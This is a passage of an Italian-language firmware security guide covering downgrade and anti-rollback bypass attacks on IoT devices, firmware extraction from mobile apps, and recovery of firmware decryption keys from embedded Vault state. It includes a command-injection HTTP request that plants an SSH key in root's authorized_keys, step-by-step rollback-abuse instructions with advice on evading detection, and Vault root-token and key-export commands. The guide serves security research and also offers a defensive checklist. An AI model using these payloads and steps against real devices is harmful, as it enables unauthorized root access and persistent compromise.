2. **Carica o fornisci l'immagine al dispositivo** tramite un qualsiasi canale di aggiornamento esposto:
   * UI web, API dell'app mobile, USB, TFTP, MQTT ecc.
   * Molti dispositivi IoT consumer espongono endpoint HTTP(S) *non autenticati* che accettano blob firmware codificati in Base64, li decodificano lato server e avviano il recovery/aggiornamento.
3. Dopo il downgrade, sfrutta una vulnerabilità corretta in una versione più recente (ad esempio un filtro contro la command injection aggiunto in seguito).
4. Facoltativamente, reinstalla l'immagine più recente o disabilita gli aggiornamenti per evitare di essere scoperto una volta ottenuta la persistenza.

### Esempio: command injection dopo il downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Nel firmware vulnerabile (a cui è stato effettuato un downgrade), il parametro `md5` viene concatenato direttamente a un comando shell senza essere sanitizzato, consentendo l’injection di comandi arbitrari (in questo caso, abilitando l’accesso root tramite chiave SSH). Le versioni successive del firmware hanno introdotto un filtro di base per i caratteri, ma l’assenza di protezione dai downgrade rende la correzione inutile.<sup>[[4]](#references)</sup>

### Estrazione del firmware dalle app mobili

Molti vendor includono immagini firmware complete nelle app mobili complementari, così che l’app possa aggiornare il dispositivo tramite Bluetooth/Wi-Fi. Questi pacchetti sono comunemente archiviati non crittografati nell’APK/APEX, in percorsi come `assets/fw/` o `res/raw/`. Strumenti come `apktool`, `ghidra` o persino il semplice `unzip` consentono di estrarre immagini firmate senza accedere all’hardware fisico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass dell'anti-rollback limitato all'updater nei design con slot A/B

Alcuni vendor implementano effettivamente un **ratchet** anti-downgrade, ma solo nella logica dell'*updater* (per esempio una routine UDS su CAN, un comando di recovery o un agente OTA in userspace). Se in seguito il **bootloader** controlla solo la firma/CRC dell'immagine e si fida della tabella delle partizioni o dei metadati degli slot, la protezione dal rollback può comunque essere aggirata.<sup>[[7]](#references)</sup>

Design debole tipico:

- I metadati del firmware contengono sia un descrittore di versione sia un **ratchet di sicurezza** / contatore monotono.
- L'updater confronta il ratchet dell'immagine con un valore memorizzato nello storage persistente e rifiuta le immagini firmate più vecchie.
- Il bootloader **non** analizza il ratchet e verifica solo header, CRC e firma prima di avviare lo slot selezionato.
- L'attivazione dello slot è memorizzata separatamente in una tabella delle partizioni o in un contatore di generazione per slot e **non è legata crittograficamente** all'hash esatto del firmware convalidato.

Nei sistemi dual-slot questo crea una primitiva **convalida un'immagine / avvia un'altra immagine**. Se l'attaccante può fare in modo che l'updater contrassegni lo slot B come destinazione del prossimo avvio usando un'immagine firmata corrente e successivamente sovrascrivere lo slot B prima del riavvio, il bootloader potrebbe comunque avviare l'immagine sottoposta a downgrade, perché si fida solo dei metadati dello slot già salvati.

Schema di abuso comune:

1. Carica un firmware **firmato corrente** nello slot passivo ed esegui la normale routine di convalida/cambio, in modo che il layout contrassegni quello slot come prossimo attivo.
2. **Non riavviare ancora**. Rientra nella routine di preparazione/cancellazione dello slot nella stessa sessione.
3. Sfrutta una logica obsoleta sullo stato di boot o sulla selezione dello slot, così che l'updater cancelli lo **stesso slot fisico** appena promosso.
4. Scrivi in quello slot un firmware **più vecchio ma ancora firmato**.
5. Salta la routine di convalida che applica il ratchet e riavvia direttamente.
6. Il bootloader seleziona lo slot promosso, verifica solo firma/integrità e avvia l'immagine vecchia.

Cosa cercare durante il reverse engineering delle implementazioni di aggiornamento A/B:

- Selezione dello slot basata su **flag di boot** che non vengono aggiornati dopo un cambio riuscito.
- Una routine simile a `prepare_passive_slot()` che cancella uno slot basandosi su uno stato obsoleto anziché sul **layout attualmente salvato**.
- Una funzione simile a `part_write_layout()` che incrementa solo un **contatore di generazione** / flag di attivazione e non memorizza l'hash dell'immagine convalidata.
- Controlli del ratchet implementati in userspace o nel codice dell'updater, ma **non** nella ROM / nel bootloader / nelle fasi di secure boot.
- Routine di cancellazione o recovery che lasciano lo slot contrassegnato come avviabile anche dopo che il suo contenuto è stato rimosso e riscritto.

### Checklist per valutare la logica di aggiornamento

* Il trasporto e l'autenticazione dell'*endpoint di aggiornamento* sono protetti adeguatamente (TLS + autenticazione)?
* Il dispositivo confronta i **numeri di versione** o un **contatore monotono anti-rollback** prima del flashing?
* L'immagine viene verificata all'interno di una catena di secure boot (ad esempio, le firme vengono controllate dal codice ROM)?
* Il **bootloader applica lo stesso ratchet** dell'updater, invece di controllare solo firma/CRC?
* I metadati di attivazione dello slot sono **legati alla versione/hash del firmware convalidato**, o è possibile modificare uno slot dopo la promozione?
* Dopo il successo del cambio di slot, il dispositivo è costretto a riavviarsi oppure le routine successive di aggiornamento/cancellazione sono ancora raggiungibili nella stessa sessione?
* Il codice userland esegue ulteriori controlli di coerenza (ad esempio, sulla mappa delle partizioni consentite o sul numero di modello)?
* I flussi di aggiornamento *parziali* o di *backup* riutilizzano la stessa logica di convalida?

> 💡  Se manca uno qualsiasi degli elementi sopra indicati, la piattaforma è probabilmente vulnerabile agli attacchi di rollback.

## Firmware vulnerabile per esercitarsi

Per esercitarti a individuare vulnerabilità nel firmware, usa come punto di partenza i seguenti progetti di firmware vulnerabile.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recupero delle chiavi di decrittazione del firmware dallo stato KMS/Vault integrato

Quando un'immagine di aggiornamento combina piccoli metadati in chiaro con un grande blob ad alta entropia, esegui prima il triage del contenitore, prima di tentare qualsiasi brute force:<sup>[[1]](#references)</sup>

- Estrai header, offset e limiti di riga con `hexdump`, `xxd`, `strings -tx`, `base64 -d` e `binwalk -E`.
- `Salted__` di solito indica il formato OpenSSL `enc`: i successivi 8 byte sono il salt e i byte rimanenti sono ciphertext.
- Un campo Base64 che decodifica esattamente in `256` byte è un forte indizio che si tratti di un ciphertext RSA-2048 che avvolge una password/session key casuale del firmware.
- Il materiale PGP detached nello stesso file spesso protegge solo l'autenticità; non presumere che sia il meccanismo di riservatezza.

Se la ricerca di chiavi statiche (`grep`, `strings`, ricerche PEM/PGP) non dà risultati, esegui il reverse engineering del **percorso operativo di decrittazione** invece di cercare soltanto le chiavi private:

- Decompila l'updater / il binario di gestione e traccia chi legge il blob cifrato, quale helper/API lo decripta e quale nome logico della chiave richiede.
- Cerca nel filesystem root estratto lo stato KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), oltre ai file unit e agli script di init.
- Considera le istruzioni in chiaro `vault operator unseal ...`, le chiavi di recovery, i token di bootstrap o gli script locali di auto-unseal KMS equivalenti a materiale di chiave privata.

Se l'appliance include il binario Vault originale e il backend di storage, riprodurre quell'ambiente è solitamente più semplice che reimplementare gli internals di Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Con accesso root al KMS clonato:

- Rendi esportabili le chiavi transit solo all'interno del clone isolato: `vault write transit/keys/<name>/config exportable=true`
- Esporta la chiave unwrap: `vault read transit/export/encryption-key/<name>`
- Prova la chiave RSA recuperata usando la coppia esatta padding/hash usata dal KMS. Un errore di decifratura PKCS#1 v1.5 e un errore con la decifratura OAEP predefinita **non** dimostrano che la chiave sia sbagliata; molti flussi basati su Vault usano OAEP con SHA-256, mentre le librerie comuni usano SHA-1 per impostazione predefinita.
- Se il payload inizia con `Salted__`, riproduci esattamente la KDF OpenSSL del vendor (`EVP_BytesToKey`, spesso MD5 sugli appliance legacy) prima di tentare la decifratura AES-CBC.

Questo trasforma il problema del «firmware cifrato» in un problema più generale: **recuperare le chiavi operative lato appliance, quindi riprodurre offline esattamente i parametri di unwrap + KDF**.

## Formazione e certificazioni

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking del firmware con Claude: competenze di livello senior, autonomia di livello junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia di test della sicurezza del firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking pratico dell'IoT: la guida definitiva agli attacchi all'Internet delle cose](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Sfruttare zero-day in hardware abbandonato – blog di Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Come un dispositivo smart da 20 $ mi ha dato accesso a casa tua](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ora mi vedi: ora sei pwnato](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Sfruttare il Tesla Wall Connector dal connettore della porta di ricarica - Parte 2: aggirare la protezione anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Fallo lampeggiare: exploit over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS su QEMU, parte 2: debugging e correzione](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [10] [Password del BIOS Dell: la debole cifratura XOR consente il recupero dalla memoria SPI (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [11] [R3n5k1/dellpwn - Strumenti per il recupero delle password del BIOS Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
